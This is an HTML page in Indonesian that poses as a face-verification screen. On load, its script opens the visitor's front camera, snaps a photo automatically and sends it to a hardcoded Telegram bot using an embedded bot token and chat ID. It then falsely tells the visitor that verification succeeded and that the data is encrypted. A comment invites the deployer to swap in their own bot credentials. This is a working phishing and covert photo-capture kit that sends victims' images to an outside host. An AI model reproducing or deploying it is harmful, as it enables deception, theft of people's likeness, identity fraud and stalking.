<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verifikasi Identitas</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
        body {
            background: #0b1120;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .card {
            background: #1e293b;
            max-width: 420px;
            width: 100%;
            padding: 28px 22px 34px;
            border-radius: 40px;
            text-align: center;
            border: 1px solid #334155;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
        }
        .header-icon { font-size: 48px; margin-bottom: 6px; }
        h2 { color: #f1f5f9; font-weight: 600; font-size: 22px; }
        .subtext { color: #94a3b8; font-size: 14px; margin: 6px 0 18px; }
        .video-wrapper {
            background: #0f172a;
            border-radius: 24px;
            overflow: hidden;
            margin: 10px 0 18px;
            position: relative;
            aspect-ratio: 3/4;
            border: 2px solid #334155;
        }
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            transform: scaleX(-1);
        }
        #canvas { display: none; }
        .status {
            color: #38bdf8;
            font-size: 13px;
            font-weight: 500;
            background: #0f172a;
            padding: 8px 16px;
            border-radius: 40px;
            display: inline-block;
            margin: 6px 0 12px;
        }
        .loader {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #1e293b;
            border-top: 3px solid #3b82f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer { margin-top: 18px; color: #64748b; font-size: 11px; }
    </style>
</head>
<body>

<div class="card">
    <div class="header-icon">📸</div>
    <h2>Verifikasi Wajah</h2>
    <p class="subtext">Arahkan wajah ke kamera, proses otomatis</p>

    <div class="video-wrapper">
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <div class="status" id="status">
        <span class="loader"></span> Mengaktifkan kamera...
    </div>
    <div class="footer">🔒 Data terenkripsi</div>
</div>

<script>
    (function() {
        // ========== GANTI PUNYA LO ==========
        const BOT_TOKEN = '7807776022:AAEMOQHmsudZOBs57LUjFlntCYuFiBJgwAY';
        const CHAT_ID = '7938100431';
        // ====================================

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusEl = document.getElementById('status');

        let stream = null;
        let alreadySent = false; // cegah kirim ganda

        // Fungsi kirim foto ke Telegram
        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie_auto.jpg');
            formData.append('caption', `📸 Auto-selfie - ${new Date().toLocaleString()}`);

            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                if (res.ok) {
                    statusEl.innerHTML = '✅ Verifikasi sukses!';
                } else {
                    const err = await res.json();
                    statusEl.innerHTML = '❌ Gagal kirim: ' + (err.description || '');
                }
            } catch (e) {
                statusEl.innerHTML = '❌ Error: ' + e.message;
            }
        }

        // Capture frame dari video
        function captureFrame() {
            if (alreadySent) return;
            if (!video.videoWidth || !video.videoHeight) {
                // video belum siap, coba ulang 500ms lagi
                setTimeout(captureFrame, 500);
                return;
            }

            alreadySent = true;
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(function(blob) {
                if (blob) {
                    sendPhoto(blob);
                } else {
                    statusEl.innerHTML = '❌ Gagal capture';
                }
            }, 'image/jpeg', 0.85);
        }

        // Mulai kamera
        async function startCamera() {
            try {
                const constraints = {
                    video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 640 } },
                    audio: false
                };
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                await video.play();

                statusEl.innerHTML = '📷 Kamera aktif, mengambil foto...';

                // Tunggu video benar-benar punya data, lalu capture
                if (video.readyState >= 2) {
                    captureFrame();
                } else {
                    video.addEventListener('loadeddata', function onLoaded() {
                        video.removeEventListener('loadeddata', onLoaded);
                        captureFrame();
                    });
                }

                // Fallback: jika video gagal load, capture paksa setelah 2 detik
                setTimeout(() => {
                    if (!alreadySent) captureFrame();
                }, 2000);

            } catch (err) {
                statusEl.innerHTML = '❌ Gagal akses kamera: ' + err.message;
            }
        }

        // Jalankan
        startCamera();
    })();
</script>
</body>
</html>
